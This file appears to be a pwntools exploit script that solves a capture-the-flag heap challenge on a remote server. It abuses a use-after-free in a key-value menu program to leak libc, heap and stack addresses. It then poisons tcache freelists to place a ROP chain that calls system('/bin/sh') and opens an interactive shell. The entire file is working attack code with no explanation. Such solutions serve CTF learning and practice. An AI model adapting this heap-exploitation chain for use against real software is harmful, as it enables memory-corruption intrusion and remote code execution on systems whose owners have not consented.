from pwn import *

context.log_level = 'debug'

# p = process('./chal')
p = remote('chal.amt.rs', 1346)

def create(idx,key_size,key,val_size='null',val='null'):
    p.sendlineafter(b'>>>',b'1')
    p.sendlineafter(b'>>>',str(idx).encode())
    p.sendlineafter(b'>>>',str(key_size).encode())
    p.sendlineafter(b'>>>',key)
    p.sendlineafter(b'>>>',str(val_size).encode())
    p.sendlineafter(b'>>>',val)

def update(idx,val):
    p.sendlineafter(b'>>>',b'2')
    p.sendlineafter(b'>>>',str(idx).encode())
    p.sendlineafter(b'>>>',val)

def read(idx):
    p.sendlineafter(b'>>>',b'3')
    p.sendlineafter(b'>>>',str(idx).encode())

def delete(idx):
    p.sendlineafter(b'>>>',b'4')
    p.sendlineafter(b'>>>',str(idx).encode())

create(0,0x18,b'z'*0x18,0x428,b'a'*0x428)
create(1,0x18,b'z'*0x18,0x428,b'a'*0x428)
create(2,0x18,b'z'*0x18,0x438,b'a'*0x438)
delete(0)
delete(1)

read(0)
p.recvuntil(b'val = ')
libc = p.recvuntil(b'\\x00'*2)
libc = u64(libc.decode('unicode-escape')) - 0x21ace0
heap = p.recvuntil(b'\\x00'*2)
heap = u64(heap.decode('unicode-escape')) & 0xfffffffffffff000
env = libc + 0x222200
pop_rdi = libc + 0x2a3e5
ret = libc + 0x29139
system  = libc + 0x50d70
print('[libc]',hex(libc))
print('[heap]',hex(heap))

create(3,0x20,b'z'*0x20,0x20,b'a'*0x20)
delete(3)

target = (env-0x10) ^ (heap+0x2a0) >> 12
update(3,p64(target)[:-1])

create(4,0x20,b'z'*0x20,0x20,b'')
read(4)
p.recvuntil(b'\\x00'*0x10)
stack = p.recvuntil(b'\\x00'*2)
stack = u64(stack.decode('unicode-escape')) - 0x128
print('[stack]',hex(stack))

create(5,0x50,b'z'*0x50,0x50,b'a'*50)
delete(5)

target = (stack) ^ (heap+0x2a0) >> 12
update(5,p64(target)[:-1])
pay = b'a'*0x8 + p64(ret) + p64(pop_rdi) + p64(stack+0x28) + p64(system) + b'/bin/sh'
create(6,0x50,b'z'*0x50,0x50,pay)

p.sendlineafter(b'>>>',b'5')

p.interactive()